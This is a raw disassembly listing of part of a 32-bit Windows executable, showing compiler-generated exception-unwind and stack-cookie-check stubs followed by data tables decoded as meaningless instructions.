  40f385:	lea    ecx,[ebp-0x24]
  40f388:	jmp    DWORD PTR ds:0x4121c0
  40f38e:	lea    ecx,[ebp-0x28]
  40f391:	jmp    DWORD PTR ds:0x4121c0
  40f397:	mov    edx,DWORD PTR [esp+0x8]
  40f39b:	lea    eax,[edx+0xc]
  40f39e:	mov    ecx,DWORD PTR [edx-0x2c]
  40f3a1:	xor    ecx,eax
  40f3a3:	call   0x40e2c0
  40f3a8:	mov    eax,0x410538
  40f3ad:	jmp    0x40eb30
  40f3b2:	int3   
  40f3b3:	int3   
  40f3b4:	int3   
  40f3b5:	int3   
  40f3b6:	int3   
  40f3b7:	lea    ecx,[ebp-0x18]
  40f3ba:	jmp    0x405903
  40f3bf:	lea    ecx,[ebp-0x1c]
  40f3c2:	jmp    0x405903
  40f3c7:	lea    ecx,[ebp-0x24]
  40f3ca:	jmp    0x405903
  40f3cf:	mov    edx,DWORD PTR [esp+0x8]
  40f3d3:	lea    eax,[edx+0xc]
  40f3d6:	mov    ecx,DWORD PTR [edx-0x30]
  40f3d9:	xor    ecx,eax
  40f3db:	call   0x40e2c0
  40f3e0:	mov    ecx,DWORD PTR [edx-0x8]
  40f3e3:	xor    ecx,eax
  40f3e5:	call   0x40e2c0
  40f3ea:	mov    eax,0x4105b0
  40f3ef:	jmp    0x40eb30
  40f3f4:	int3   
  40f3f5:	int3   
  40f3f6:	int3   
  40f3f7:	int3   
  40f3f8:	int3   
  40f3f9:	lea    ecx,[ebp-0x1c]
  40f3fc:	jmp    0x405903
  40f401:	mov    edx,DWORD PTR [esp+0x8]
  40f405:	lea    eax,[edx+0xc]
  40f408:	mov    ecx,DWORD PTR [edx-0x38]
  40f40b:	xor    ecx,eax
  40f40d:	call   0x40e2c0
  40f412:	mov    ecx,DWORD PTR [edx-0x8]
  40f415:	xor    ecx,eax
  40f417:	call   0x40e2c0
  40f41c:	mov    eax,0x410654
  40f421:	jmp    0x40eb30
  40f426:	int3   
  40f427:	int3   
  40f428:	int3   
  40f429:	int3   
  40f42a:	int3   
  40f42b:	lea    ecx,[ebp-0x18]
  40f42e:	jmp    0x405903
  40f433:	mov    edx,DWORD PTR [esp+0x8]
  40f437:	lea    eax,[edx+0xc]
  40f43a:	mov    ecx,DWORD PTR [edx-0x20]
  40f43d:	xor    ecx,eax
  40f43f:	call   0x40e2c0
  40f444:	mov    ecx,DWORD PTR [edx-0x8]
  40f447:	xor    ecx,eax
  40f449:	call   0x40e2c0
  40f44e:	mov    eax,0x4106b4
  40f453:	jmp    0x40eb30
  40f458:	int3   
  40f459:	int3   
  40f45a:	int3   
  40f45b:	int3   
  40f45c:	int3   
  40f45d:	lea    ecx,[ebp-0x1c]
  40f460:	jmp    DWORD PTR ds:0x4121c0
  40f466:	mov    edx,DWORD PTR [esp+0x8]
  40f46a:	lea    eax,[edx+0xc]
  40f46d:	mov    ecx,DWORD PTR [edx-0x48]
  40f470:	xor    ecx,eax
  40f472:	call   0x40e2c0
  40f477:	mov    eax,0x410714
  40f47c:	jmp    0x40eb30
  40f481:	int3   
  40f482:	int3   
  40f483:	int3   
  40f484:	int3   
  40f485:	int3   
  40f486:	lea    ecx,[ebp-0x28]
  40f489:	jmp    0x40893a
  40f48e:	lea    ecx,[ebp-0x14]
  40f491:	jmp    0x405903
  40f496:	mov    edx,DWORD PTR [esp+0x8]
  40f49a:	lea    eax,[edx+0xc]
  40f49d:	mov    ecx,DWORD PTR [edx-0x2c]
  40f4a0:	xor    ecx,eax
  40f4a2:	call   0x40e2c0
  40f4a7:	mov    eax,0x410774
  40f4ac:	jmp    0x40eb30
  40f4b1:	int3   
  40f4b2:	int3   
  40f4b3:	int3   
  40f4b4:	int3   
  40f4b5:	int3   
  40f4b6:	lea    ecx,[ebp-0x20]
  40f4b9:	jmp    0x40893a
  40f4be:	mov    edx,DWORD PTR [esp+0x8]
  40f4c2:	lea    eax,[edx+0xc]
  40f4c5:	mov    ecx,DWORD PTR [edx-0x24]
  40f4c8:	xor    ecx,eax
  40f4ca:	call   0x40e2c0
  40f4cf:	mov    eax,0x4107ec
  40f4d4:	jmp    0x40eb30
  40f4d9:	int3   
  40f4da:	int3   
  40f4db:	int3   
  40f4dc:	int3   
  40f4dd:	int3   
  40f4de:	lea    ecx,[ebp-0x28]
  40f4e1:	jmp    0x40893a
  40f4e6:	mov    edx,DWORD PTR [esp+0x8]
  40f4ea:	lea    eax,[edx+0xc]
  40f4ed:	mov    ecx,DWORD PTR [edx-0x2c]
  40f4f0:	xor    ecx,eax
  40f4f2:	call   0x40e2c0
  40f4f7:	mov    eax,0x410818
  40f4fc:	jmp    0x40eb30
  40f501:	int3   
  40f502:	int3   
  40f503:	int3   
  40f504:	int3   
  40f505:	int3   
  40f506:	lea    ecx,[ebp-0x14]
  40f509:	jmp    DWORD PTR ds:0x4121c0
  40f50f:	mov    edx,DWORD PTR [esp+0x8]
  40f513:	lea    eax,[edx+0xc]
  40f516:	mov    ecx,DWORD PTR [edx-0x18]
  40f519:	xor    ecx,eax
  40f51b:	call   0x40e2c0
  40f520:	mov    eax,0x410878
  40f525:	jmp    0x40eb30
  40f52a:	int3   
  40f52b:	int3   
  40f52c:	int3   
  40f52d:	int3   
  40f52e:	int3   
  40f52f:	lea    ecx,[ebp-0x14]
  40f532:	jmp    DWORD PTR ds:0x4121c0
  40f538:	lea    ecx,[ebp-0x18]
  40f53b:	jmp    DWORD PTR ds:0x4121c0
  40f541:	lea    ecx,[ebp-0x18]
  40f544:	jmp    DWORD PTR ds:0x4121c0
  40f54a:	lea    ecx,[ebp-0x18]
  40f54d:	jmp    DWORD PTR ds:0x4121c0
  40f553:	lea    ecx,[ebp-0x18]
  40f556:	jmp    DWORD PTR ds:0x4121c0
  40f55c:	lea    ecx,[ebp-0x18]
  40f55f:	jmp    DWORD PTR ds:0x4121c0
  40f565:	lea    ecx,[ebp-0x18]
  40f568:	jmp    DWORD PTR ds:0x4121c0
  40f56e:	lea    ecx,[ebp-0x18]
  40f571:	jmp    DWORD PTR ds:0x4121c0
  40f577:	mov    edx,DWORD PTR [esp+0x8]
  40f57b:	lea    eax,[edx+0xc]
  40f57e:	mov    ecx,DWORD PTR [edx-0x20]
  40f581:	xor    ecx,eax
  40f583:	call   0x40e2c0
  40f588:	mov    eax,0x4108d8
  40f58d:	jmp    0x40eb30
  40f592:	int3   
  40f593:	int3   
  40f594:	int3   
  40f595:	int3   
  40f596:	int3   
  40f597:	lea    ecx,[ebp-0x1c]
  40f59a:	jmp    0x405903
  40f59f:	mov    edx,DWORD PTR [esp+0x8]
  40f5a3:	lea    eax,[edx+0xc]
  40f5a6:	mov    ecx,DWORD PTR [edx-0x34]
  40f5a9:	xor    ecx,eax
  40f5ab:	call   0x40e2c0
  40f5b0:	mov    ecx,DWORD PTR [edx-0x8]
  40f5b3:	xor    ecx,eax
  40f5b5:	call   0x40e2c0
  40f5ba:	mov    eax,0x410980
  40f5bf:	jmp    0x40eb30
  40f5c4:	int3   
  40f5c5:	int3   
  40f5c6:	int3   
  40f5c7:	int3   
  40f5c8:	int3   
  40f5c9:	lea    ecx,[ebp-0x2c]
  40f5cc:	jmp    0x40893a
  40f5d1:	mov    edx,DWORD PTR [esp+0x8]
  40f5d5:	lea    eax,[edx+0xc]
  40f5d8:	mov    ecx,DWORD PTR [edx-0x30]
  40f5db:	xor    ecx,eax
  40f5dd:	call   0x40e2c0
  40f5e2:	mov    eax,0x4109e0
  40f5e7:	jmp    0x40eb30
  40f5ec:	int3   
  40f5ed:	int3   
  40f5ee:	int3   
  40f5ef:	int3   
  40f5f0:	int3   
  40f5f1:	lea    ecx,[ebp-0x2c]
  40f5f4:	jmp    0x40893a
  40f5f9:	mov    edx,DWORD PTR [esp+0x8]
  40f5fd:	lea    eax,[edx+0xc]
  40f600:	mov    ecx,DWORD PTR [edx-0x30]
  40f603:	xor    ecx,eax
  40f605:	call   0x40e2c0
  40f60a:	mov    eax,0x410a40
  40f60f:	jmp    0x40eb30
  40f614:	int3   
  40f615:	int3   
  40f616:	int3   
  40f617:	int3   
  40f618:	int3   
  40f619:	lea    ecx,[ebp-0x1c]
  40f61c:	jmp    0x405903
  40f621:	lea    ecx,[ebp-0x1c]
  40f624:	jmp    0x405903
  40f629:	lea    ecx,[ebp-0x1c]
  40f62c:	jmp    0x405903
  40f631:	lea    ecx,[ebp-0x1c]
  40f634:	jmp    0x405903
  40f639:	lea    ecx,[ebp-0x24]
  40f63c:	jmp    0x405903
  40f641:	lea    ecx,[ebp-0x1c]
  40f644:	jmp    0x405903
  40f649:	lea    ecx,[ebp-0x24]
  40f64c:	jmp    0x405903
  40f651:	lea    ecx,[ebp-0x24]
  40f654:	jmp    0x405903
  40f659:	lea    ecx,[ebp-0x24]
  40f65c:	jmp    0x405903
  40f661:	mov    edx,DWORD PTR [esp+0x8]
  40f665:	lea    eax,[edx+0xc]
  40f668:	mov    ecx,DWORD PTR [edx-0x3c]
  40f66b:	xor    ecx,eax
  40f66d:	call   0x40e2c0
  40f672:	mov    ecx,DWORD PTR [edx-0x8]
  40f675:	xor    ecx,eax
  40f677:	call   0x40e2c0
  40f67c:	mov    eax,0x410aa0
  40f681:	jmp    0x40eb30
  40f686:	int3   
  40f687:	int3   
  40f688:	int3   
  40f689:	int3   
  40f68a:	int3   
  40f68b:	lea    ecx,[ebp-0x28]
  40f68e:	jmp    0x40893a
  40f693:	lea    ecx,[ebp-0x14]
  40f696:	jmp    0x405903
  40f69b:	mov    edx,DWORD PTR [esp+0x8]
  40f69f:	lea    eax,[edx+0xc]
  40f6a2:	mov    ecx,DWORD PTR [edx-0x2c]
  40f6a5:	xor    ecx,eax
  40f6a7:	call   0x40e2c0
  40f6ac:	mov    eax,0x410b40
  40f6b1:	jmp    0x40eb30
  40f6b6:	int3   
  40f6b7:	int3   
  40f6b8:	int3   
  40f6b9:	int3   
  40f6ba:	int3   
  40f6bb:	lea    ecx,[ebp-0x18]
  40f6be:	jmp    DWORD PTR ds:0x4121c0
  40f6c4:	lea    ecx,[ebp-0x28]
  40f6c7:	jmp    0x405903
  40f6cc:	lea    ecx,[ebp-0x24]
  40f6cf:	jmp    DWORD PTR ds:0x4121c0
  40f6d5:	lea    ecx,[ebp-0x24]
  40f6d8:	jmp    DWORD PTR ds:0x4121c0
  40f6de:	lea    ecx,[ebp-0x24]
  40f6e1:	jmp    DWORD PTR ds:0x4121c0
  40f6e7:	lea    ecx,[ebp-0x24]
  40f6ea:	jmp    DWORD PTR ds:0x4121c0
  40f6f0:	lea    ecx,[ebp-0x24]
  40f6f3:	jmp    DWORD PTR ds:0x4121c0
  40f6f9:	mov    edx,DWORD PTR [esp+0x8]
  40f6fd:	lea    eax,[edx+0xc]
  40f700:	mov    ecx,DWORD PTR [edx-0x3c]
  40f703:	xor    ecx,eax
  40f705:	call   0x40e2c0
  40f70a:	mov    ecx,DWORD PTR [edx-0x8]
  40f70d:	xor    ecx,eax
  40f70f:	call   0x40e2c0
  40f714:	mov    eax,0x410ba8
  40f719:	jmp    0x40eb30
  40f71e:	int3   
  40f71f:	int3   
  40f720:	int3   
  40f721:	int3   
  40f722:	int3   
  40f723:	lea    ecx,[ebp-0x24]
  40f726:	jmp    0x40893a
  40f72b:	mov    edx,DWORD PTR [esp+0x8]
  40f72f:	lea    eax,[edx+0xc]
  40f732:	mov    ecx,DWORD PTR [edx-0x28]
  40f735:	xor    ecx,eax
  40f737:	call   0x40e2c0
  40f73c:	mov    eax,0x410c48
  40f741:	jmp    0x40eb30
  40f746:	int3   
  40f747:	int3   
  40f748:	int3   
  40f749:	int3   
  40f74a:	int3   
  40f74b:	mov    eax,DWORD PTR [ebp-0x10]
  40f74e:	and    eax,0x1
  40f751:	je     0x40f763
  40f757:	and    DWORD PTR [ebp-0x10],0xfffffffe
  40f75b:	mov    ecx,DWORD PTR [ebp-0x14]
  40f75e:	jmp    0x405903
  40f763:	ret    
  40f764:	mov    edx,DWORD PTR [esp+0x8]
  40f768:	lea    eax,[edx+0xc]
  40f76b:	mov    ecx,DWORD PTR [edx-0x18]
  40f76e:	xor    ecx,eax
  40f770:	call   0x40e2c0
  40f775:	mov    eax,0x410c74
  40f77a:	jmp    0x40eb30
  40f77f:	int3   
  40f780:	int3   
  40f781:	int3   
  40f782:	int3   
  40f783:	int3   
  40f784:	mov    eax,DWORD PTR [ebp-0x10]
  40f787:	and    eax,0x1
  40f78a:	je     0x40f79c
  40f790:	and    DWORD PTR [ebp-0x10],0xfffffffe
  40f794:	mov    ecx,DWORD PTR [ebp+0x8]
  40f797:	jmp    0x405903
  40f79c:	ret    
  40f79d:	mov    edx,DWORD PTR [esp+0x8]
  40f7a1:	lea    eax,[edx+0xc]
  40f7a4:	mov    ecx,DWORD PTR [edx-0x14]
  40f7a7:	xor    ecx,eax
  40f7a9:	call   0x40e2c0
  40f7ae:	mov    eax,0x410ca0
  40f7b3:	jmp    0x40eb30
  40f7b8:	int3   
  40f7b9:	int3   
  40f7ba:	int3   
  40f7bb:	int3   
  40f7bc:	int3   
  40f7bd:	lea    ecx,[ebp-0x1f4]
  40f7c3:	jmp    DWORD PTR ds:0x4121c0
  40f7c9:	mov    edx,DWORD PTR [esp+0x8]
  40f7cd:	lea    eax,[edx+0xc]
  40f7d0:	mov    ecx,DWORD PTR [edx-0x204]
  40f7d6:	xor    ecx,eax
  40f7d8:	call   0x40e2c0
  40f7dd:	mov    ecx,DWORD PTR [edx-0x4]
  40f7e0:	xor    ecx,eax
  40f7e2:	call   0x40e2c0
  40f7e7:	mov    eax,0x410ccc
  40f7ec:	jmp    0x40eb30
  40f7f1:	int3   
  40f7f2:	int3   
  40f7f3:	int3   
  40f7f4:	int3   
  40f7f5:	int3   
  40f7f6:	int3   
  40f7f7:	int3   
  40f7f8:	and    al,BYTE PTR ds:0x51993
  40f7fe:	add    BYTE PTR [eax],al
  40f800:	sbb    al,0xf8
  40f802:	inc    eax
	...
  40f81b:	add    bh,bh
  40f81d:	(bad)  
  40f81e:	(bad)  
  40f81f:	jmp    DWORD PTR [ebp-0x15]
  40f822:	inc    eax
  40f823:	add    BYTE PTR [eax],al
  40f825:	add    BYTE PTR [eax],al
  40f827:	add    BYTE PTR [esi-0x15],ch
  40f82a:	inc    eax
  40f82b:	add    BYTE PTR [ecx],al
  40f82d:	add    BYTE PTR [eax],al
  40f82f:	add    BYTE PTR [edi-0x15],dh
  40f832:	inc    eax
  40f833:	add    BYTE PTR [edx],al
  40f835:	add    BYTE PTR [eax],al
  40f837:	add    BYTE PTR [eax-0xffbf15],al
  40f83d:	(bad)  
  40f83e:	(bad)  
  40f83f:	dec    DWORD PTR [ecx+0x220040eb]
  40f845:	add    eax,0x41993
  40f84a:	add    BYTE PTR [eax],al
  40f84c:	push   0x20040f8
  40f851:	add    BYTE PTR [eax],al
  40f853:	add    BYTE PTR [eax+0x40f8],cl
	...
  40f865:	add    BYTE PTR [eax],al
  40f867:	add    bh,bh
  40f869:	(bad)  
  40f86a:	(bad)  
  40f86b:	inc    DWORD PTR [eax]
  40f86d:	add    BYTE PTR [eax],al
  40f86f:	add    bh,bh
  40f871:	(bad)  
  40f872:	(bad)  
  40f873:	inc    DWORD PTR [eax]
  40f875:	add    BYTE PTR [eax],al
  40f877:	add    bh,bh
  40f879:	(bad)  
  40f87a:	(bad)  
  40f87b:	inc    DWORD PTR [eax]
  40f87d:	add    BYTE PTR [eax],al
  40f87f:	add    bh,bh
  40f881:	(bad)  
  40f882:	(bad)  
  40f883:	inc    DWORD PTR [eax]
	...
  40f88d:	add    BYTE PTR [eax],al
  40f88f:	add    BYTE PTR [ecx],al
  40f891:	add    BYTE PTR [eax],al
  40f893:	add    BYTE PTR [ecx],al
  40f895:	add    BYTE PTR [eax],al
  40f897:	add    BYTE PTR [eax+0x20040f8],dh
  40f89d:	add    BYTE PTR [eax],al
  40f89f:	add    BYTE PTR [edx],al
  40f8a1:	add    BYTE PTR [eax],al
  40f8a3:	add    BYTE PTR [ebx],al
  40f8a5:	add    BYTE PTR [eax],al
  40f8a7:	add    BYTE PTR [ecx],al
  40f8a9:	add    BYTE PTR [eax],al
  40f8ab:	add    al,al
  40f8ad:	clc    
  40f8ae:	inc    eax
	...
  40f8bb:	add    bl,bh
  40f8bd:	and    eax,DWORD PTR [eax+0x0]
	...
  40f8cc:	xlat   BYTE PTR ds:[ebx]
  40f8cd:	and    eax,DWORD PTR [eax+0x0]
  40f8d0:	and    al,BYTE PTR ds:0x261993
  40f8d6:	add    BYTE PTR [eax],al
  40f8d8:	clc    
  40f8d9:	clc    
  40f8da:	inc    eax
  40f8db:	add    BYTE PTR ds:0x28000000,al
  40f8e1:	cli    
  40f8e2:	inc    eax
	...
  40f8f7:	add    bh,bh
  40f8f9:	(bad)  
  40f8fa:	(bad)  
  40f8fb:	(bad)  
  40f8fc:	call   0x4139ec
  40f901:	add    BYTE PTR [eax],al
  40f903:	add    cl,dh
  40f905:	jmp    0x40f947
  40f907:	add    BYTE PTR [ecx],al
  40f909:	add    BYTE PTR [eax],al
  40f90b:	add    ch,bh
  40f90d:	jmp    0x40f94f
  40f90f:	add    BYTE PTR [edx],al
  40f911:	add    BYTE PTR [eax],al
  40f913:	add    BYTE PTR [ecx],cl
  40f915:	in     al,dx
  40f916:	inc    eax
  40f917:	add    BYTE PTR [ebx],al
  40f919:	add    BYTE PTR [eax],al
  40f91b:	add    BYTE PTR ds:0x40040ec,dl
  40f921:	add    BYTE PTR [eax],al
  40f923:	add    BYTE PTR [esi],bl
  40f925:	in     al,dx
  40f926:	inc    eax
  40f927:	add    BYTE PTR ds:0x27000000,al
  40f92d:	in     al,dx
  40f92e:	inc    eax
  40f92f:	add    BYTE PTR [esi],al
  40f931:	add    BYTE PTR [eax],al
  40f933:	add    BYTE PTR [ebx],dh
  40f935:	in     al,dx
  40f936:	inc    eax
  40f937:	add    BYTE PTR [edi],al
  40f939:	add    BYTE PTR [eax],al
  40f93b:	add    BYTE PTR [edi],bh
  40f93d:	in     al,dx
  40f93e:	inc    eax
  40f93f:	add    BYTE PTR [eax],cl
  40f941:	add    BYTE PTR [eax],al
  40f943:	add    BYTE PTR [ebx-0x14],cl
  40f946:	inc    eax
  40f947:	add    BYTE PTR [ecx],cl
  40f949:	add    BYTE PTR [eax],al
  40f94b:	add    BYTE PTR [edi-0x14],dl
  40f94e:	inc    eax
  40f94f:	add    BYTE PTR [edx],cl
  40f951:	add    BYTE PTR [eax],al
  40f953:	add    BYTE PTR [ebx-0x14],ah
  40f956:	inc    eax
  40f957:	add    BYTE PTR [ebx],cl
  40f959:	add    BYTE PTR [eax],al
  40f95b:	add    BYTE PTR [edi-0x14],ch
  40f95e:	inc    eax
  40f95f:	add    BYTE PTR [eax+eax*1],cl
  40f962:	add    BYTE PTR [eax],al
  40f964:	jnp    0x40f952
  40f966:	inc    eax
  40f967:	add    BYTE PTR ds:0x87000000,cl
  40f96d:	in     al,dx
  40f96e:	inc    eax
  40f96f:	add    BYTE PTR [esi],cl
  40f971:	add    BYTE PTR [eax],al
  40f973:	add    BYTE PTR [ebx+0xf0040ec],dl
  40f979:	add    BYTE PTR [eax],al
  40f97b:	add    BYTE PTR [esp+ebp*8+0x100040],bl
  40f982:	add    BYTE PTR [eax],al
  40f984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f985:	in     al,dx
  40f986:	inc    eax
  40f987:	add    BYTE PTR [ecx],dl
  40f989:	add    BYTE PTR [eax],al
  40f98b:	add    BYTE PTR [esi+0x120040ec],ch
  40f991:	add    BYTE PTR [eax],al
  40f993:	add    BYTE PTR [edi+0x130040ec],dh
  40f999:	add    BYTE PTR [eax],al
  40f99b:	add    BYTE PTR [eax],al
  40f99d:	add    BYTE PTR [eax],al
  40f99f:	add    BYTE PTR [eax+eax*1],dl
  40f9a2:	add    BYTE PTR [eax],al
  40f9a4:	ret    
  40f9a5:	in     al,dx
  40f9a6:	inc    eax
  40f9a7:	add    BYTE PTR [ebx],dl
  40f9a9:	add    BYTE PTR [eax],al
  40f9ab:	add    BYTE PTR [eax],al
  40f9ad:	add    BYTE PTR [eax],al
  40f9af:	add    BYTE PTR [ebx],dl
  40f9b1:	add    BYTE PTR [eax],al
  40f9b3:	add    BYTE PTR [eax],al
  40f9b5:	add    BYTE PTR [eax],al
  40f9b7:	add    BYTE PTR [edi],dl
  40f9b9:	add    BYTE PTR [eax],al
  40f9bb:	add    dh,cl
  40f9bd:	in     al,dx
  40f9be:	inc    eax
  40f9bf:	add    BYTE PTR [ebx],dl
  40f9c1:	add    BYTE PTR [eax],al
  40f9c3:	add    BYTE PTR [eax],al
  40f9c5:	add    BYTE PTR [eax],al
  40f9c7:	add    BYTE PTR [ebx],dl
  40f9c9:	add    BYTE PTR [eax],al
  40f9cb:	add    dl,bl
  40f9cd:	in     al,dx
  40f9ce:	inc    eax
  40f9cf:	add    BYTE PTR [edx],bl
  40f9d1:	add    BYTE PTR [eax],al
  40f9d3:	add    dh,ah
  40f9d5:	in     al,dx
  40f9d6:	inc    eax
  40f9d7:	add    BYTE PTR [ebx],bl
  40f9d9:	add    BYTE PTR [eax],al
  40f9db:	add    BYTE PTR [eax],al
  40f9dd:	add    BYTE PTR [eax],al
  40f9df:	add    BYTE PTR [ebx],bl
  40f9e1:	add    BYTE PTR [eax],al
  40f9e3:	add    BYTE PTR [eax],al
  40f9e5:	add    BYTE PTR [eax],al
  40f9e7:	add    BYTE PTR [ebx],dl
  40f9e9:	add    BYTE PTR [eax],al
  40f9eb:	add    dl,dh
  40f9ed:	in     al,dx
  40f9ee:	inc    eax
  40f9ef:	add    BYTE PTR [esi],bl
  40f9f1:	add    BYTE PTR [eax],al
  40f9f3:	add    dh,bh
  40f9f5:	in     al,dx
  40f9f6:	inc    eax
  40f9f7:	add    BYTE PTR [edi],bl
  40f9f9:	add    BYTE PTR [eax],al
  40f9fb:	add    BYTE PTR [edx],cl
  40f9fd:	in     eax,dx
  40f9fe:	inc    eax
  40f9ff:	add    BYTE PTR [eax],ah
  40fa01:	add    BYTE PTR [eax],al
  40fa03:	add    BYTE PTR [eax],al
  40fa05:	add    BYTE PTR [eax],al
  40fa07:	add    BYTE PTR [eax],ah
  40fa09:	add    BYTE PTR [eax],al
  40fa0b:	add    BYTE PTR [eax],al
  40fa0d:	add    BYTE PTR [eax],al
  40fa0f:	add    BYTE PTR [ebx],dl
  40fa11:	add    BYTE PTR [eax],al
  40fa13:	add    BYTE PTR [eax],al
  40fa15:	add    BYTE PTR [eax],al
  40fa17:	add    BYTE PTR [ebx],ah
  40fa19:	add    BYTE PTR [eax],al
  40fa1b:	add    BYTE PTR [esi],dl
  40fa1d:	in     eax,dx
  40fa1e:	inc    eax
  40fa1f:	add    BYTE PTR [ebx],dl
  40fa21:	add    BYTE PTR [eax],al
  40fa23:	add    BYTE PTR [eax],al
  40fa25:	add    BYTE PTR [eax],al
  40fa27:	add    BYTE PTR [eax+eax*1],dl
  40fa2a:	add    BYTE PTR [eax],al
  40fa2c:	adc    eax,0x16000000
  40fa31:	add    BYTE PTR [eax],al
  40fa33:	add    BYTE PTR [ecx],al
  40fa35:	add    BYTE PTR [eax],al
  40fa37:	add    BYTE PTR [edx+edi*8+0x170040],cl
  40fa3e:	add    BYTE PTR [eax],al
  40fa40:	sbb    BYTE PTR [eax],al
  40fa42:	add    BYTE PTR [eax],al
  40fa44:	sbb    DWORD PTR [eax],eax
  40fa46:	add    BYTE PTR [eax],al
  40fa48:	add    DWORD PTR [eax],eax
  40fa4a:	add    BYTE PTR [eax],al
  40fa4c:	pushf  
  40fa4d:	cli    
  40fa4e:	inc    eax
  40fa4f:	add    BYTE PTR [eax+eax*1],bl
  40fa52:	add    BYTE PTR [eax],al
  40fa54:	sbb    al,0x0
  40fa56:	add    BYTE PTR [eax],al
  40fa58:	sbb    eax,0x1000000
  40fa5d:	add    BYTE PTR [eax],al
  40fa5f:	add    BYTE PTR [edx+edi*8+0x210040],ch
  40fa66:	add    BYTE PTR [eax],al
  40fa68:	and    DWORD PTR [eax],eax
  40fa6a:	add    BYTE PTR [eax],al
  40fa6c:	and    al,BYTE PTR [eax]
  40fa6e:	add    BYTE PTR [eax],al
  40fa70:	add    DWORD PTR [eax],eax
  40fa72:	add    BYTE PTR [eax],al
  40fa74:	mov    esp,0x230040fa
  40fa79:	add    BYTE PTR [eax],al
  40fa7b:	add    BYTE PTR [eax+eax*1],ah
  40fa7e:	add    BYTE PTR [eax],al
  40fa80:	and    eax,0x1000000
  40fa85:	add    BYTE PTR [eax],al
  40fa87:	add    ah,cl
  40fa89:	cli    
  40fa8a:	inc    eax
  40fa8b:	add    BYTE PTR [eax],cl
  40fa8d:	add    BYTE PTR [eax],al
  40fa8f:	add    BYTE PTR [eax],dl
  40fa91:	adc    BYTE PTR [ecx+0x0],al
  40fa94:	clc    
  40fa95:	(bad)  
  40fa96:	(bad)  
  40fa97:	dec    DWORD PTR [edx]
  40fa99:	xor    eax,DWORD PTR [eax+0x0]
	...
  40faa8:	out    dx,eax
  40faa9:	xor    al,BYTE PTR [eax+0x0]
	...
  40fab8:	mov    edx,0x4032
	...
  40fac5:	add    BYTE PTR [eax],al
  40fac7:	add    BYTE PTR [edx+esi*1+0x40],ch
	...
  40fad7:	add    BYTE PTR [eax],ah
  40fad9:	xor    DWORD PTR [eax+0x0],eax
  40fadc:	add    BYTE PTR [eax],al
  40fade:	add    BYTE PTR [eax],al
  40fae0:	and    al,BYTE PTR ds:0xe1993
  40fae6:	add    BYTE PTR [eax],al
  40fae8:	inc    eax
  40fae9:	sti    
  40faea:	inc    eax
  40faeb:	add    BYTE PTR [ebx],al
  40faed:	add    BYTE PTR [eax],al
  40faef:	add    BYTE PTR [ebx+edi*8],al
  40faf2:	inc    eax
	...
  40fb03:	add    BYTE PTR [esi],al
  40fb05:	add    BYTE PTR [eax],al
  40fb07:	add    BYTE PTR [edi],al
  40fb09:	add    BYTE PTR [eax],al
  40fb0b:	add    BYTE PTR [eax],cl
  40fb0d:	add    BYTE PTR [eax],al
  40fb0f:	add    BYTE PTR [ecx],al
  40fb11:	add    BYTE PTR [eax],al
  40fb13:	add    BYTE PTR [eax+0x90040fb],dh
  40fb19:	add    BYTE PTR [eax],al
  40fb1b:	add    BYTE PTR [edx],cl
  40fb1d:	add    BYTE PTR [eax],al
  40fb1f:	add    BYTE PTR [ebx],cl
  40fb21:	add    BYTE PTR [eax],al
  40fb23:	add    BYTE PTR [ecx],al
  40fb25:	add    BYTE PTR [eax],al
  40fb27:	add    al,al
  40fb29:	sti    
  40fb2a:	inc    eax
  40fb2b:	add    BYTE PTR [eax+eax*1],cl
  40fb2e:	add    BYTE PTR [eax],al
  40fb30:	or     al,0x0
  40fb32:	add    BYTE PTR [eax],al
  40fb34:	or     eax,0x1000000
  40fb39:	add    BYTE PTR [eax],al
  40fb3b:	add    al,dl
  40fb3d:	sti    
  40fb3e:	inc    eax
  40fb3f:	add    bh,bh
  40fb41:	(bad)  
  40fb42:	(bad)  
  40fb43:	dec    DWORD PTR [edi-0x13]
  40fb46:	inc    eax
  40fb47:	add    BYTE PTR [eax],al
  40fb49:	add    BYTE PTR [eax],al
  40fb4b:	add    BYTE PTR [eax-0x13],bl
  40fb4e:	inc    eax
  40fb4f:	add    BYTE PTR [ecx],al
  40fb51:	add    BYTE PTR [eax],al
  40fb53:	add    BYTE PTR [ecx-0x13],ah
  40fb56:	inc    eax
  40fb57:	add    BYTE PTR [edx],al
  40fb59:	add    BYTE PTR [eax],al
  40fb5b:	add    BYTE PTR [edx-0x13],ch
  40fb5e:	inc    eax
  40fb5f:	add    BYTE PTR [ebx],al
  40fb61:	add    BYTE PTR [eax],al
  40fb63:	add    BYTE PTR [ebx-0x13],dh
  40fb66:	inc    eax
  40fb67:	add    BYTE PTR [eax+eax*1],al
  40fb6a:	add    BYTE PTR [eax],al
  40fb6c:	jl     0x40fb5b
  40fb6e:	inc    eax
  40fb6f:	add    BYTE PTR ds:0x0,al
  40fb75:	add    BYTE PTR [eax],al
  40fb77:	add    BYTE PTR [esi],al
  40fb79:	add    BYTE PTR [eax],al
  40fb7b:	add    BYTE PTR [ebp+0x50040ed],al
  40fb81:	add    BYTE PTR [eax],al
  40fb83:	add    BYTE PTR [eax],al
  40fb85:	add    BYTE PTR [eax],al
  40fb87:	add    BYTE PTR ds:0x0,al
  40fb8d:	add    BYTE PTR [eax],al
  40fb8f:	add    BYTE PTR [ecx],cl
  40fb91:	add    BYTE PTR [eax],al
  40fb93:	add    BYTE PTR [eax+0x50040ed],dl
  40fb99:	add    BYTE PTR [eax],al
  40fb9b:	add    BYTE PTR [eax],al
  40fb9d:	add    BYTE PTR [eax],al
  40fb9f:	add    BYTE PTR ds:0x0,al
  40fba5:	add    BYTE PTR [eax],al
  40fba7:	add    BYTE PTR ds:0x0,al
  40fbad:	add    BYTE PTR [eax],al
  40fbaf:	add    BYTE PTR [eax],cl
  40fbb1:	add    BYTE PTR [eax],al
  40fbb3:	add    BYTE PTR [eax],dl
  40fbb5:	adc    BYTE PTR [ecx+0x0],al
  40fbb8:	push   eax
  40fbb9:	(bad)  
  40fbba:	(bad)  
  40fbbb:	(bad)  
  40fbbc:	fstp   TBYTE PTR [eax]
  40fbbe:	inc    eax
	...
  40fbcb:	add    bl,al
  40fbcd:	cmp    BYTE PTR [eax+0x0],al
	...
  40fbdc:	push   esp
  40fbdd:	cmp    BYTE PTR [eax+0x0],al
  40fbe0:	and    al,BYTE PTR ds:0x91993
  40fbe6:	add    BYTE PTR [eax],al
  40fbe8:	sbb    ah,bh
  40fbea:	inc    eax
  40fbeb:	add    BYTE PTR [ecx],al
  40fbed:	add    BYTE PTR [eax],al
  40fbef:	add    BYTE PTR [esp+edi*8],al
